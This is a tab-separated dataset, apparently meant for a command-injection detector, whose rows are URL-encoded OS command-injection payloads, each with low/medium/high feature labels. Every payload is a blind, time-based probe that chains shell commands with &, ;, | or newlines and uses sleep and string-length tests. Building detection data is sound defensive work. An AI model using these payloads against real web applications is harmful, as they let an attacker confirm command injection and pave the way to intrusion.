attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20qeluff%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%252f%252f	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20qeluff%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%252f%252f	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20qeluff%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%252f%252f	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20qeluff%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%252f%252f	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20qeluff%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20okmzve%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%252f%252f	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20urvljv%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%2526	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20pengwj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%2526	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20kigxdw%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20nigljv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%2526	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20qiikmd%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%257c	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20pfmsxe%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%257c	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fapceg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20srsafa%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%257c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20epcbgx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20pdveeq%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20erxffg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20erxffg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20erxffg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20erxffg%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
